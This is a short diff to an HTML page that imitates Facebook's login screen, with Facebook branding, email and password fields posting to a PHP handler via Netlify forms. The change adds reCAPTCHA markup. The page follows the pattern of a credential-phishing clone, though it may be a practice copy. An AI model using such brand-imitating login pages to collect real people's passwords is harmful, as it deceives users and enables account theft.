@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <form action="inset.php" method="POST" name="contact" data-netlify='true'>
+    <form action="inset.php" method="POST" name="contact" data-netlify='true' data-netlify-recaptcha="true">
         <div class="textbox">
             <h1>facebook</h1>
             <h2>Facebook helps you connect and share <br> the people in your life.</h3>
@@ -16,6 +16,9 @@
             <div class="form">
                 <input type="text" class="text" placeholder="Email adress or phone number"><br>
                 <input type="password" class="text" placeholder="Password"><br>
+                <div class="my-2">
+                        <div data-netlify-recaptcha="true"></div>
+                </div>
                 <button type="submit">
                     Login
                 </button>
